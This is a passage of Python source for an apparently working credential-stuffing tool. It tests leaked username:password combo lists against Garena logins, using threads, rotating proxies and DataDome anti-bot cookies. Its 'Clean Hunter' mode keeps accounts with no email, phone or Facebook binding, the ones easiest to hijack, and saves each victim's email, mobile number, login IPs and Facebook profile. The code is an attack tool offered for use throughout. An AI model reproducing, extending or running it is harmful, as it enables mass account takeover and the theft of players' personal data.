                    s.cookies.set("datadome", dd, domain=".garena.com")
            _tl.s = s
            _tl.dm = dm
        return _tl.s, _tl.dm

    def _print_line(tag, account, password, note=""):
        tags = {"valid": ("[bold #96AA7A]VALID  [/]", "#96AA7A"), "invalid": ("[bold #8C7A6B]INVALID[/]", "#8C7A6B"), "error": ("[bold #A89888]ERROR  [/]", "#A89888")}
        tag_str, col = tags.get(tag, ("[dim]------[/dim]", "dim"))
        with print_lock:
            if tag == "valid":
                console.print(f"  {tag_str}  [{col}]{account}:{password}[/{col}]")
            else:
                reason = note.upper() if note else ("INCORRECT PASSWORD" if tag == "invalid" else "UNKNOWN ERROR")
                console.print(f"  {tag_str}  [{col}]{account}:{password}[/{col}] - [dim]{reason}[/dim]")

    def _print_live_stats():
        with st_lock:
            v = vl["valid"]
            iv = vl["invalid"]
            er = vl["error"]
            dn = vl["done"]
        elapsed = max(time.time() - start_time, 0.001)
        rate = dn / elapsed
        eta = (total - dn) / rate if rate > 0 else 0
        pct = dn / total * 100 if total > 0 else 0
        bar_w = 20
        filled = int(pct / 100 * bar_w)
        bar = chr(9608) * filled + chr(9617) * (bar_w - filled)
        with print_lock:
            console.print(f"\n  [bold {THEME_WARNING}][{bar}] {pct:.1f}%[/]  [bold {THEME_PRIMARY}]{dn}/{total}[/]  [{THEME_SUCCESS}]Valid:{v}[/]  [{THEME_ERROR}]Invalid:{iv}[/]  [dim]Err:{er}[/dim]  [dim]{rate:.1f}/s  ETA {int(eta//60)}m{int(eta%60):02d}s[/dim]\n")

    def _check_one(acc_pw):
        if stop_ev.is_set():
            return
        account, password = acc_pw
        result = "error"
        note = ""
        try:
            session, dm = _get_sess()
            thread_id = getattr(_tl, "thread_id", 0)
            if proxy_manager:
                proxy_manager.apply_to_session(session, thread_id)
            current_proxy = proxy_manager.current_url if proxy_manager else None
            try:
                v1, v2, _ = _prelogin_no_ip_wait(session, account, dm)
                if not v1 or not v2:
                    result = "invalid"
                    note = "Account Not Found"
                else:
                    sso_key = login(session, account, password, v1, v2)
                    if sso_key:
                        result = "valid"
                        note = ""
                    else:
                        result = "invalid"
                        note = "Incorrect Password"
                if proxy_manager and current_proxy:
                    proxy_manager.report_success(current_proxy)
            except (ConnectionError, TimeoutError, OSError):
                if proxy_manager and current_proxy:
                    proxy_manager.report_error(current_proxy)
                raise
            if proxy_manager and proxy_manager.tick():
                proxy_manager.apply_to_session(session, thread_id)
        except:
            result = "error"
            note = "Error"

        with file_lock:
            if result == "valid":
                valid_fh.write(f"{account}:{password}\n")
            elif result == "invalid":
                invalid_fh.write(f"{account}:{password}\n")
            else:
                error_fh.write(f"{account}:{password}  | {note}\n")

        with st_lock:
            vl[result] += 1
            vl["done"] += 1
            done_now = vl["done"]

        _print_line(result, account, password, note)
        if done_now % 20 == 0 or done_now == total:
            _print_live_stats()

    console.print(f"  [dim]Output: {out_dir}[/dim]\n")
    if proxy_manager:
        proxy_manager.set_thread_count(num_threads)

    try:
        with ThreadPoolExecutor(max_workers=num_threads) as ex:
            futs = {ex.submit(_check_one, ap): ap for ap in accounts}
            for fut in as_completed(futs):
                if stop_ev.is_set():
                    break
                try:
                    fut.result(timeout=30)
                except:
                    pass
    except KeyboardInterrupt:
        stop_ev.set()
        console.print("\n  [bold yellow]Stopping — flushing results...[/bold yellow]")

    elapsed = max(time.time() - start_time, 0.001)
    with st_lock:
        v = vl["valid"]
        iv = vl["invalid"]
        er = vl["error"]
        dn = vl["done"]

    valid_fh.close()
    invalid_fh.close()
    error_fh.close()

    def _bar(cnt, denom, color, w=22):
        if denom == 0:
            return f"[dim]{'░'*w}[/dim]"
        f2 = int(cnt / denom * w)
        return f"[{color}]{'█'*f2}[/{color}][dim]{'░'*(w-f2)}[/dim]"

    t1 = Table(show_header=True, box=None, padding=(0, 2))
    t1.add_column("Category", style=f"bold {THEME_PRIMARY}", min_width=12, no_wrap=True)
    t1.add_column("Count", justify="right", style="bold white", min_width=7)
    t1.add_column("Pct", justify="right", style=f"bold {THEME_WARNING}", min_width=7)
    t1.add_column("Visual", min_width=24)
    for label, cnt, col in [("Valid", v, "green"), ("Invalid", iv, "red"), ("Errors", er, "dim red")]:
        pct_s = f"{cnt/total*100:.1f}%" if total else "0.0%"
        t1.add_row(label, str(cnt), pct_s, _bar(cnt, total, col))

    t2 = Table(show_header=False, box=None, padding=(0, 2))
    t2.add_column(style=f"bold {THEME_PRIMARY}", min_width=16, no_wrap=True)
    t2.add_column(style="bold white", min_width=18, no_wrap=True)
    t2.add_row("Total Time", f"{int(elapsed//60)}m {int(elapsed%60)}s")
    t2.add_row("Rate", f"{dn/elapsed:.2f} acc/s")
    t2.add_row("Processed", f"{dn}/{total}")
    t2.add_row("Valid saved", f"[cyan]{valid_path}[/]")
    t2.add_row("Invalid saved", f"[cyan]{invalid_path}[/]")
    t2.add_row("Errors saved", f"[cyan]{error_path}[/]")

    console.print("\n")
    console.print(Panel(Group(t1, t2), title=f"[bold {THEME_WARNING}]VALIDATOR — FINAL RESULTS[/]", border_style="grey50", padding=(0, 1)))
    console.print("  [dim]Powered by @rrielqt[/dim]\n")
    console.input("  [dim]Press Enter to return to menu...[/dim]")

def clean_hunter():
    clear_screen()
    display_banner()

    global CHECK_OTHER_GAMES

    console.print(Panel(
        "[bold #96AA7A]◆  CLEAN HUNTER MODE[/bold #96AA7A]\n"
        "[dim]Only saves accounts that are:[/dim]\n"
        "  [#96AA7A]✔[/] [dim]CLEAN  (no email verified, no phone, no FB, no ID)[/dim]\n"
        "  [#96AA7A]✔[/] [dim]HAS CODM connected[/dim]\n\n"
        "[dim]Everything else is skipped instantly for maximum speed.[/dim]",
        border_style="grey50", padding=(0, 2)
    ))
    console.print("")

    file_manager = AccountFileManager()
    file_viewer = AccountFileViewer()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        console.print("  [red]No .txt files found in Combo folder.[/red]")
        console.input("\n  [dim]Press Enter to return to menu...[/dim]")
        return

    file_infos = []
    for file_path in combo_files:
        info = file_manager.get_file_info(file_path)
        if info:
            file_infos.append(info)
    if not file_infos:
        console.print("  [red]No valid combo files.[/red]")
        console.input("\n  [dim]Press Enter to return to menu...[/dim]")
        return

    file_viewer.display_file_table(file_infos)
    selected_file = file_viewer.prompt_file_selection(file_infos)

    clean_choice = ask_config(
        "FILE CLEANING",
        "CLEAN FILE ENCODING?",
        [("Y", "YES, REMOVE INVALID CHARACTERS"), ("N", "NO, KEEP AS IS")]
    )
    if clean_choice == 'y':
        with console.status("[yellow]Cleaning file encoding...[/yellow]", spinner="dots"):
            valid_c, invalid_c = file_manager.clean_file_encoding(selected_file)
        console.print(f"  [{THEME_SUCCESS}]Cleaned: {valid_c} valid, {invalid_c} removed[/]")

    dup_choice = ask_config(
        "DUPLICATE REMOVAL",
        "REMOVE DUPLICATE LINES?",
        [("Y", "YES, REMOVE DUPLICATES"), ("N", "NO, KEEP AS IS")]
    )
    if dup_choice == 'y':
        with console.status("[yellow]Removing duplicates...[/yellow]", spinner="dots"):
            removed = file_manager.clean_duplicates(selected_file)
        console.print(f"  [{THEME_SUCCESS}]Removed {removed} duplicate(s)[/]")

    accounts = []
    try:
        with open(selected_file, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                acc, pw = clean_account_line(line)
                if acc and pw:
                    accounts.append((acc, pw))
    except:
        console.print("  [red]Could not read file.[/red]")
        return

    if not accounts:
        console.print("  [red]No valid accounts found.[/red]")
        return

    console.print(f"  [{THEME_PRIMARY}]Loaded [bold]{len(accounts):,}[/bold] combos[/]\n")

    CHECK_OTHER_GAMES = ask_config(
        "GAME CONNECTIONS",
        "CHECK OTHER GAMES ON HITS? (AOV, ROV, etc.)",
        [("Y", "YES, SCAN GAME CONNECTIONS"), ("N", "CODM ONLY")]
    ) == 'y'

    min_level = 0
    level_choice = ask_config(
        "LEVEL FILTER",
        "MINIMUM CODM LEVEL TO SAVE?",
        [("0", "SAVE ALL LEVELS"), ("1", "LEVEL 1 AND ABOVE"), ("50", "LEVEL 50 AND ABOVE"), ("100", "LEVEL 100 AND ABOVE")]
    )
    try:
        min_level = int(level_choice)
    except:
        min_level = 0

    thread_choice = ask_config(
        "THREAD CONFIGURATION",
        "SELECT THREAD MODE",
        [
            ("1", "01-03 — Negligible"),
            ("2", "04-07 — Marginal"),
            ("3", "08-11 — Moderate"),
            ("4", "12-15 — Significant"),
            ("5", "16-19 — Substantial"),
            ("6", "20-23 — High"),
            ("7", "24-27 — Severe"),
            ("8", "28-30 — Critical")
        ]
    )
    num_threads = THREAD_MODES[thread_choice]
    console.print(f"  [{THEME_SUCCESS}]Running with {num_threads} thread(s)[/]\n")

    ts_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    stem = Path(selected_file).stem
    out_dir = Path("Results") / f"clean_hunter_{stem}_{ts_str}"
    out_dir.mkdir(parents=True, exist_ok=True)

    clean_codm_path = out_dir / "clean_with_codm.txt"
    clean_only_path = out_dir / "clean_no_codm.txt"
    summary_path = out_dir / "summary.txt"

    ch_fh = open(clean_codm_path, "a", encoding="utf-8", buffering=1)
    co_fh = open(clean_only_path, "a", encoding="utf-8", buffering=1)
    game_fh = {}

    vl = {"clean_codm": 0, "clean_only": 0, "not_clean": 0, "skipped_level": 0, "error": 0, "done": 0, "highest_lvl": 0, "highest_ign": "N/A", "highest_region": "N/A", "highest_account": "N/A"}
    hits_list = []
    st_lock = threading.Lock()
    file_lock = threading.Lock()
    stop_ev = threading.Event()
    start_time = time.time()
    total = len(accounts)

    cookie_manager_h = CookieManager(server_url=SERVER_COOKIE_URL)
    _tl = threading.local()

    def _get_sess():
        if not hasattr(_tl, "s"):
            _tl.thread_id = proxy_manager.assign_thread_id() if proxy_manager else 0
            s = cloudscraper.create_scraper()
            if proxy_manager:
                if getattr(proxy_manager, "_hybrid", False):
                    pd = _hybrid_next()
                    if pd:
                        s.proxies.update(pd)
                else:
                    proxy_manager.apply_to_session(s, _tl.thread_id)
            dm = DataDomeManager()
            cks = cookie_manager_h.get_valid_cookies()
            if cks:
                applyck(s, "; ".join(cks))
                for part in cks[-1].split(";"):
                    part = part.strip()
                    if part.startswith("datadome="):
                        dm.set_datadome(part.split("=", 1)[1].strip())
                        break
            else:
                dd = get_datadome_cookie(s)
                if dd:
                    dm.set_datadome(dd)
                    s.cookies.set("datadome", dd, domain=".garena.com")
            _tl.s = s
            _tl.dm = dm
        return _tl.s, _tl.dm

    def _masked_pass(pw):
        if len(pw) <= 2:
            return pw[0] + "***"
        return pw[:2] + "***"

    def _print_hit(account, password, lvl, region, ign, is_clean_codm, game_connections=None, details=None):
        masked = _masked_pass(password)
        acc_short = account[:14] + "…" if len(account) > 14 else account
        ign_short = ign[:10] + "…" if ign and len(ign) > 10 else ign
        others = [g.get("game","?") for g in (game_connections or []) if g.get("game","").upper() != "CODM"]
        g_str = f" [dim]+{'+'.join(others)}[/dim]" if others else ""
        if is_clean_codm:
            personal = (details or {}).get("personal", {})
            profile = (details or {}).get("profile", {})
            facebook_d = (details or {}).get("facebook", {})
            security_d = (details or {}).get("security", {})
            last_login_list = (details or {}).get("login_history", [])
            last_login_info = last_login_list[0] if last_login_list else {}
            email_raw = (details or {}).get("email", "N/A") or "N/A"
            email_ver = (details or {}).get("email_verified", False)
            if email_raw != "N/A":
                email_display = f"{email_raw} ({'Verified' if email_ver else 'Unverified'})"
            else:
                email_display = "N/A"
            mobile_no = personal.get("mobile_no", "N/A")
            country_code = personal.get("country_code", None)
            fmt_mobile = format_mobile_number(mobile_no, country_code) if mobile_no and mobile_no != "N/A" else "N/A"
            shell = profile.get("shell_balance", 0)
            country = personal.get("country", "N/A")
            username_d = (details or {}).get("username", "N/A") or "N/A"
            binds = (details or {}).get("binds", [])
            fb_uid = facebook_d.get("fb_uid", "N/A") or "N/A"
            fb_username = facebook_d.get("fb_username", "N/A") or "N/A"
            fb_link = f"https://www.facebook.com/profile.php?id={fb_uid}" if fb_uid != "N/A" else "N/A"
            fb_conn = security_d.get("facebook_connected", False)
            fb_info = f"Connected — {fb_username}" if fb_conn and fb_uid != "N/A" else "NOT CONNECTED"
            _ll_ts = last_login_info.get("timestamp", 0)
            ll_date = time.strftime("%B %d, %Y | %I:%M %p", time.localtime(_ll_ts)) if _ll_ts else "N/A"
            ll_where = last_login_info.get("source", "N/A") or "N/A"
            ll_ip = last_login_info.get("ip", "N/A") or "N/A"
            ll_country = last_login_info.get("country", "N/A") or "N/A"
            ign_str = ign if ign and ign != "N/A" else "N/A"
            reg_str = region if region and region != "N/A" else "N/A"
            _tbl = Table(show_header=False, box=None, padding=(0, 1))
            _tbl.add_column(style="dim", min_width=14, no_wrap=True)
            _tbl.add_column(style="white", no_wrap=False)
            def _r(label, val, color="white"):
                _tbl.add_row(label, f"[{color}]{val}[/{color}]")
            _r("Username", username_d)
            _r("Shell", shell, "bright_yellow")
            _r("Email", email_display)
            _r("Mobile", fmt_mobile)
            _r("Country", country)
            _r("Binds", ', '.join(binds) if binds else 'None', "yellow")
            _r("Facebook", fb_info)
            _r("FB Link", fb_link, "dim")
            _r("Level", lvl, "bright_cyan")
            _r("Region", reg_str, "yellow")
            _r("IGN", ign_str, "bright_white")
            _r("Last Login", ll_date, "dim")
            _r("Login From", f"{ll_where} | {ll_ip} | {ll_country}", "dim")
            _cred = f"[bold white]{account}[/bold white][dim]:{masked}[/dim]"
            console.print(Panel(_tbl, title=f"[bold #96AA7A]CLEAN[/bold #96AA7A]  {_cred}", border_style="grey50", padding=(0, 1)))
        else:
            if others:
                label = "[bold #96AA7A][CLEAN][/bold #96AA7A]"
                game_str = f" [bright_magenta]{'+'.join(others)}[/bright_magenta]"
            else:
                label = "[bold green][CLEAN][/bold green]"
                game_str = ""
            console.print(f"  {label} [white]{acc_short}[/white][dim]:{masked}[/dim] [dim]noCODM[/dim]{game_str}")
        with st_lock:
            _clean_hit_count[0] += 1

    def _format_hit_file(account, password, lvl, region, ign, uid, details, game_connections):
        sep = "=" * 60
        personal = details.get("personal", {})
        profile = details.get("profile", {})
        facebook = details.get("facebook", {})
        security = details.get("security", {})
        last_login_list = details.get("login_history", [])
        last_login_info = last_login_list[0] if last_login_list else {}
        email_raw = details.get("email", "N/A") or "N/A"
        email_ver = details.get("email_verified", False)
        if email_raw and email_raw != "N/A":
            email_display = f"{email_raw} ({'Verified' if email_ver else 'Not Verified'})"
        else:
            email_display = "N/A"
        mobile_no = personal.get("mobile_no", "N/A")
        country_code = personal.get("country_code", None)
        formatted_mobile = format_mobile_number(mobile_no, country_code) if mobile_no and mobile_no != "N/A" else "N/A"
        country = personal.get("country", "N/A")
        username = details.get("username", "N/A") or "N/A"
        nickname = details.get("nickname", "N/A") or "N/A"
        shell = profile.get("shell_balance", 0)
        binds = details.get("binds", [])
        bind_status = details.get("bind_status", "Clean")
        fb_uid = facebook.get("fb_uid", "N/A") or "N/A"
        fb_username = facebook.get("fb_username", "N/A") or "N/A"
        fb_link = f"https://www.facebook.com/profile.php?id={fb_uid}" if fb_uid != "N/A" else "N/A"
        fb_connected = security.get("facebook_connected", False)
        if fb_connected and fb_uid != "N/A":
            fb_info = f"Connected — {fb_username}"
        else:
            fb_info = "NOT CONNECTED"
        _ll_ts = last_login_info.get("timestamp", 0)
        last_login_date = time.strftime("%B %d, %Y | %I:%M %p", time.localtime(_ll_ts)) if _ll_ts else "N/A"
        last_login_where = last_login_info.get("source", "N/A") or "N/A"
        last_login_ip = last_login_info.get("ip", "N/A") or "N/A"
        last_login_country = last_login_info.get("country", "N/A") or "N/A"
        lines = [sep, f"Account        : {account}:{password}", f"UID            : {uid}", f"Username       : {username}", f"Garena Shell   : {shell}", f"Email          : {email_display}", f"Mobile         : {formatted_mobile}", f"Country        : {country}", f"Nickname       : {nickname}", f"Bind Status    : {bind_status}", f"Binds          : {', '.join(binds) if binds else 'None'}", "", "--- Facebook Information ---", f"Facebook Username : {fb_username}", f"Facebook UID      : {fb_uid}", f"Facebook Link     : {fb_link}", f"Facebook Status   : {fb_info}", "", "--- CODM Information ---", f"Account Level  : {lvl}", f"Server         : {region}", f"IGN            : {ign}", f"CODM UID       : {uid}", "", "--- Login History ---", f"Last Login         : {last_login_date}", f"Last Login From    : {last_login_where}", f"Last Login IP      : {last_login_ip}", f"Last Login Country : {last_login_country}", "", f"Account Status : CLEAN"]
        if game_connections:
            others = [g for g in game_connections if g.get("game", "").upper() != "CODM"]
            if others:
                lines.append("")
                lines.append("--- Other Games ---")
                for g in others:
                    lines.append(f"{g.get('game','?')} [{g.get('region','?')}] : {g.get('role','N/A')}")
        lines += ["", "Powered by: @rrielqt", sep, ""]
        return "\n".join(lines)

    def _format_clean_no_codm_file(account, password, details, game_connections=None):
        sep = "=" * 60
        personal = details.get("personal", {})
        profile = details.get("profile", {})
        facebook = details.get("facebook", {})
        security = details.get("security", {})
        last_login_list = details.get("login_history", [])
        last_login_info = last_login_list[0] if last_login_list else {}
        email_raw = details.get("email", "N/A") or "N/A"
        email_ver = details.get("email_verified", False)
        if email_raw and email_raw != "N/A":
            email_display = f"{email_raw} ({'Verified' if email_ver else 'Not Verified'})"
        else:
            email_display = "N/A"
        mobile_no = personal.get("mobile_no", "N/A")
        country_code = personal.get("country_code", None)
        formatted_mobile = format_mobile_number(mobile_no, country_code) if mobile_no and mobile_no != "N/A" else "N/A"
        country = personal.get("country", "N/A")
        username = details.get("username", "N/A") or "N/A"
        nickname = details.get("nickname", "N/A") or "N/A"
        shell = profile.get("shell_balance", 0)
        binds = details.get("binds", [])
        bind_status = details.get("bind_status", "Clean")
        fb_uid = facebook.get("fb_uid", "N/A") or "N/A"
        fb_username = facebook.get("fb_username", "N/A") or "N/A"
        fb_link = f"https://www.facebook.com/profile.php?id={fb_uid}" if fb_uid != "N/A" else "N/A"
        fb_connected = security.get("facebook_connected", False)
        if fb_connected and fb_uid != "N/A":
            fb_info = f"Connected — {fb_username}"
        else:
            fb_info = "NOT CONNECTED"
        _ll_ts = last_login_info.get("timestamp", 0)
        last_login_date = time.strftime("%B %d, %Y | %I:%M %p", time.localtime(_ll_ts)) if _ll_ts else "N/A"
        last_login_where = last_login_info.get("source", "N/A") or "N/A"
        last_login_ip = last_login_info.get("ip", "N/A") or "N/A"
        last_login_country = last_login_info.get("country", "N/A") or "N/A"
        lines = [sep, f"Account        : {account}:{password}", f"Username       : {username}", f"Garena Shell   : {shell}", f"Email          : {email_display}", f"Mobile         : {formatted_mobile}", f"Country        : {country}", f"Nickname       : {nickname}", f"Bind Status    : {bind_status}", f"Binds          : {', '.join(binds) if binds else 'None'}", "", "--- Facebook Information ---", f"Facebook Username : {fb_username}", f"Facebook UID      : {fb_uid}", f"Facebook Link     : {fb_link}", f"Facebook Status   : {fb_info}", "", "--- CODM Information ---", "No CODM Account", "", "--- Login History ---", f"Last Login         : {last_login_date}", f"Last Login From    : {last_login_where}", f"Last Login IP      : {last_login_ip}", f"Last Login Country : {last_login_country}", "", f"Account Status : CLEAN — No CODM"]
        others = [g for g in (game_connections or []) if g.get("game", "").upper() != "CODM"]
        if others:
            lines.append("")
            lines.append("--- Other Games ---")
            for g in others:
                lines.append(f"{g.get('game','?')} [{g.get('region','?')}] : {g.get('role','N/A')}")
        lines += ["", "Powered by: @rrielqt", sep, ""]
        return "\n".join(lines)

    def _check_one(acc_pw):
        if stop_ev.is_set():
            return
        account, password = acc_pw
        try:
            session, dm = _get_sess()
            thread_id = getattr(_tl, "thread_id", 0)
            if proxy_manager:
                proxy_manager.apply_to_session(session, thread_id)
            current_proxy = proxy_manager.current_url if proxy_manager else None
            datadome = dm.get_datadome()
            if datadome:
                dm.set_session_datadome(session, datadome)
            else:
                dd = get_datadome_cookie(session)
                if dd:
                    dm.set_datadome(dd)
                    dm.set_session_datadome(session, dd)
            v1, v2, new_dd = prelogin(session, account, dm)
            if new_dd:
                dm.set_datadome(new_dd)
            if not v1 or not v2:
                with st_lock:
                    vl["error"] += 1
                    vl["done"] += 1
                return
            sso_key = login(session, account, password, v1, v2)
            if not sso_key:
                with st_lock:
                    vl["error"] += 1
                    vl["done"] += 1
                return
            current_cookies = session.cookies.get_dict()
            cookie_parts = [f"{n}={current_cookies[n]}" for n in ("apple_state_key", "datadome", "sso_key") if n in current_cookies]
            headers = {"accept": "*/*", "referer": "https://account.garena.com/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36"}
            if cookie_parts:
                headers["cookie"] = "; ".join(cookie_parts)
            resp = session.get("https://account.garena.com/api/account/init", headers=headers, timeout=12)
            if resp.status_code != 200:
                with st_lock:
                    vl["error"] += 1
                    vl["done"] += 1
                return
            try:
                account_json = resp.json()
            except:
                with st_lock:
                    vl["error"] += 1
                    vl["done"] += 1
                return
            if "error" in account_json or "error_auth" in account_json:
                with st_lock:
                    vl["error"] += 1
                    vl["done"] += 1
                return
            if "user_info" in account_json:
                details = parse_account_details(account_json)
            else:
                details = parse_account_details({"user_info": account_json})
            details["login_history"] = account_json.get("login_history", [])
            if not details.get("is_clean", False):
                with st_lock:
                    vl["not_clean"] += 1
                    vl["done"] += 1
                return
            has_codm, codm_info = check_codm_account(session, account)
            if not has_codm:
                gc_no_codm = []
                if CHECK_OTHER_GAMES:
                    try:
                        gc_no_codm = get_game_connections(session, account)
                    except:
                        pass
                entry = _format_clean_no_codm_file(account, password, details, gc_no_codm)
                with file_lock:
                    co_fh.write(entry)
                    for g in gc_no_codm:
                        gname = g.get("game", "").upper().strip()
                        if gname and gname != "CODM":
                            if gname not in game_fh:
                                gpath = out_dir / f"{gname}_clean.txt"
                                game_fh[gname] = open(gpath, "a", encoding="utf-8", buffering=1)
                            game_fh[gname].write(entry)
                _print_hit(account, password, 0, "N/A", "N/A", False, gc_no_codm)
                with st_lock:
                    vl["clean_only"] += 1
                    vl["done"] += 1
                return
            lvl = int(codm_info.get("codm_level", 0))
            region = codm_info.get("region", "N/A")
            ign = codm_info.get("codm_nickname", "N/A")
            uid = codm_info.get("uid", "N/A")
            if min_level > 0 and lvl < min_level:
                with st_lock:
                    vl["skipped_level"] += 1
                    vl["done"] += 1
                return
            game_connections = []
            if CHECK_OTHER_GAMES:
                try:
                    game_connections = get_game_connections(session, account)
                except:
                    pass
            _print_hit(account, password, lvl, region, ign, True, game_connections, details)
            entry = _format_hit_file(account, password, lvl, region, ign, uid, details, game_connections)
            with file_lock:
                ch_fh.write(entry)
                hits_list.append((lvl, entry))
            with st_lock:
                vl["clean_codm"] += 1
                vl["done"] += 1
                if lvl > vl["highest_lvl"]:
                    vl["highest_lvl"] = lvl
                    vl["highest_ign"] = ign
                    vl["highest_region"] = region
                    vl["highest_account"] = account
            if proxy_manager and current_proxy:
                proxy_manager.report_success(current_proxy)
            if proxy_manager and proxy_manager.tick():
                proxy_manager.apply_to_session(session, thread_id)
        except:
            if proxy_manager and current_proxy:
                proxy_manager.report_error(current_proxy)
            with st_lock:
                vl["error"] += 1
                vl["done"] += 1

    _clean_hit_count = [0]

    clear_screen()
    display_banner()
    console.print(f"  [dim]Output: {out_dir}[/dim]\n")
    if proxy_manager:
        proxy_manager.set_thread_count(num_threads)

    def _print_live_ch():
        with st_lock:
            cc2 = vl["clean_codm"]
            co2 = vl["clean_only"]
            er2 = vl["error"]
            dn2 = vl["done"]
            hl = vl["highest_lvl"]
            hi = vl["highest_ign"]
        elapsed2 = max(time.time() - start_time, 0.001)
        rate2 = dn2 / elapsed2
        hi_str = f" TOP:Lv.{hl} {hi[:10]}" if hl > 0 else ""
        console.print(f"  [{THEME_SUCCESS}]◆[/] [{THEME_SUCCESS}]+CODM:{cc2}[/] [{THEME_SUCCESS}]CLEAN:{co2}[/] [dim]Err:{er2} {rate2:.1f}/s{hi_str}[/dim]")

    try:
        with ThreadPoolExecutor(max_workers=num_threads) as ex:
            futs = {ex.submit(_check_one, ap): ap for ap in accounts}
            for fut in as_completed(futs):
                if stop_ev.is_set():
                    break
                try:
                    fut.result(timeout=30)
                except:
                    pass
                _print_live_ch()
    except KeyboardInterrupt:
        stop_ev.set()
        console.print("\n  [bold yellow]Stopping — flushing results...[/bold yellow]")
    finally:
        ch_fh.close()
        co_fh.close()
        for fh in game_fh.values():
            fh.close()

    hits_list.sort(key=lambda x: x[0], reverse=True)
    if hits_list:
        sorted_path = out_dir / "clean_with_codm_sorted.txt"
        with open(sorted_path, "w", encoding="utf-8", errors="replace") as sf:
            for _, entry in hits_list:
                sf.write(entry)

    elapsed = max(time.time() - start_time, 0.001)
    with st_lock:
        cc = vl["clean_codm"]
        co = vl["clean_only"]
        nc = vl["not_clean"]
        sl = vl["skipped_level"]
        er = vl["error"]
        dn = vl["done"]
        hl = vl["highest_lvl"]
        hi = vl["highest_ign"]
        hr = vl["highest_region"]
        ha = vl["highest_account"]

    with open(summary_path, "w", encoding="utf-8") as sf:
        if hl > 0:
            sf.write(f"Highest Clean+CODM: Lv.{hl}  IGN:{hi}  Region:{hr}  Account:{ha}\n")
        sf.write("=" * 50 + "\n")
        sf.write("CLEAN HUNTER SUMMARY\n")
        sf.write("=" * 50 + "\n")
        sf.write(f"Total Checked   : {dn}\n")
        sf.write(f"Clean + CODM    : {cc}\n")
        sf.write(f"Clean (no CODM) : {co}\n")
        sf.write(f"Not Clean       : {nc}\n")
        sf.write(f"Skipped (level) : {sl}\n")
        sf.write(f"Errors          : {er}\n")
        sf.write(f"Time Elapsed    : {int(elapsed // 60)}m {int(elapsed % 60)}s\n")
        sf.write(f"Speed           : {dn / elapsed:.2f} acc/s\n")
        if min_level > 0:
            sf.write(f"Min Level Filter: {min_level}+\n")
        sf.write("=" * 50 + "\n")
        sf.write("Powered by: @rrielqt\n")

    def _bar(cnt, denom, color, w=22):
        if denom == 0:
            return f"[dim]{'░' * w}[/dim]"
        f2 = int(cnt / denom * w)
        return f"[{color}]{'█' * f2}[/{color}][dim]{'░' * (w - f2)}[/dim]"

    t1 = Table(show_header=True, box=None, padding=(0, 2))
    t1.add_column("Category", style=f"bold {THEME_PRIMARY}", min_width=18, no_wrap=True)
    t1.add_column("Count", justify="right", style="bold white", min_width=7)
    t1.add_column("Pct", justify="right", style=f"bold {THEME_WARNING}", min_width=7)
    t1.add_column("Visual", min_width=24)
    for label, cnt, col in [("Clean + CODM", cc, "bright_green"), ("Clean (no CODM)", co, "green"), ("Not Clean", nc, "yellow"), ("Skipped (level)", sl, "dim"), ("Errors", er, "red")]:
        pct_s = f"{cnt / total * 100:.1f}%" if total else "0.0%"
        t1.add_row(label, str(cnt), pct_s, _bar(cnt, total, col))

    t2 = Table(show_header=False, box=None, padding=(0, 2))
    t2.add_column(style=f"bold {THEME_PRIMARY}", min_width=20, no_wrap=True)
    t2.add_column(style="bold white", min_width=18, no_wrap=True)
    t2.add_row("Total Checked", f"{dn:,}")
    t2.add_row("Total Time", f"{int(elapsed // 60)}m {int(elapsed % 60)}s")
    t2.add_row("Speed", f"{dn / elapsed:.2f} acc/s")
    if min_level > 0:
        t2.add_row("Level Filter", f"{min_level}+")
    if hl > 0:
        t2.add_row("Highest Clean", f"[bold {THEME_PRIMARY}]Lv.{hl}  {hi}  {hr}[/]")
        t2.add_row("Account", f"[dim]{ha}[/dim]")
    t2.add_row("Clean+CODM file", f"[cyan]clean_with_codm.txt[/]")
    t2.add_row("Sorted by level", f"[cyan]clean_with_codm_sorted.txt[/]")
    t2.add_row("Clean only file", f"[cyan]clean_no_codm.txt[/]")
    t2.add_row("Summary", f"[cyan]summary.txt[/]")

    console.print("\n")
    console.print(Panel(Group(t1, t2), title="[bold #96AA7A]◆ CLEAN HUNTER — FINAL RESULTS[/]", border_style="grey50", padding=(0, 1)))
    console.print("  [dim]Powered by @rrielqt[/dim]\n")
    console.input("  [dim]Press Enter to return to menu...[/dim]")

def single_check():
    clear_screen()
    display_banner()
    console.print(Panel("[dim]Enter credentials to check a single account.[/dim]", title=f"[bold {THEME_PRIMARY}]SINGLE CHECK[/]", border_style=THEME_BORDER, padding=(0,2)))
    console.print("")

    cookie_manager = CookieManager(server_url=SERVER_COOKIE_URL)
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    live_stats.set_total(1)
    results_manager = ResultsManager()
    file_manager = AccountFileManager()

    session = cloudscraper.create_scraper()
    if proxy_manager:
        proxy_manager.apply_to_session(session)

    valid_cookies = cookie_manager.get_valid_cookies()
    if valid_cookies:
        combined = "; ".join(valid_cookies)
        applyck(session, combined)
        dd_line = valid_cookies[-1]
        for part in dd_line.split(';'):
            part = part.strip()
            if part.startswith('datadome='):
                datadome_manager.set_datadome(part.split('=', 1)[1].strip())
                break
    else:
        datadome = get_datadome_cookie(session)
        if datadome:
            datadome_manager.set_datadome(datadome)

    while True:
        account = console.input("  [bold #D4C4A8]> Username/Email: [/]").strip()
        if not account:
            console.print("  [#8C7A6B]Cannot be empty.[/]\n")
            continue
        password = console.input("  [bold #D4C4A8]> Password: [/]").strip()
        if not password:
            console.print("  [#8C7A6B]Cannot be empty.[/]\n")
            continue
        console.print(f"\n  [dim]Checking: {account}...[/dim]\n")
        result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path=None, auto_remove=False, use_elegant_display=True)
        if result:
            print(result)
        save_response = console.input("\n  [bold #C4A47A]> Save result? (y/n): [/]").strip().lower()
        if save_response != 'y':
            try:
                results_manager.valid_file.unlink(missing_ok=True)
                results_manager.no_codm_file.unlink(missing_ok=True)
                for lf in results_manager.level_files.values():
                    lf.unlink(missing_ok=True)
            except:
                pass
            console.print("  [yellow]Not saved.[/]")
        else:
            console.print(f"  [{THEME_SUCCESS}]Saved to Results/ folder.[/]")
        cont = console.input("\n  [bold #D4C4A8]> Check another? (y/n): [/]").strip().lower()
        if cont != 'y':
            break
        session.close()
